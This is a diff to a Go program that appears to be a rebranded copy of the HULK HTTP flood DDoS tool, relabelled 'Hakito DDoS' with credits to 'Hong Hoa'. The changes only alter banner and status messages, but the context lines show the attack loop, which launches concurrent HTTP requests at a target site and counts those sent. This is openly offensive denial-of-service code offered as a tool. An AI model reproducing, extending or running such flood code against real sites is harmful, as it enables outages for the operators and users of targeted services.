@@ -7535,7 +7535,7 @@ func main() {
 			err, sent int32
 		)
 		fmt.Println("                    Hakito DDoS              
-\t begin |\t Go.                           |                              \t Tool DDoS By Hong Hoa")
+\t begin |\t Go.")
 		for {
 			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
 				go httpcall(site, u.Host, data, headers, ss)
@@ -7555,7 +7555,7 @@ func main() {
 			case targetComplete:
 				sent++
 				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
-				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
+				fmt.Println("\r-- HAKITO Attack Finished --       \n\n\r")
 				os.Exit(0)
 			}
 		}
@@ -7564,7 +7564,7 @@ func main() {
 	ctlc := make(chan os.Signal)
 	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
 	<-ctlc
-	fmt.Println("\r\n-- Interrupted by user --        \n")
+	fmt.Println("\r\n-- Interrupted by LeHongHoa --        \n")
 }
 
 func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
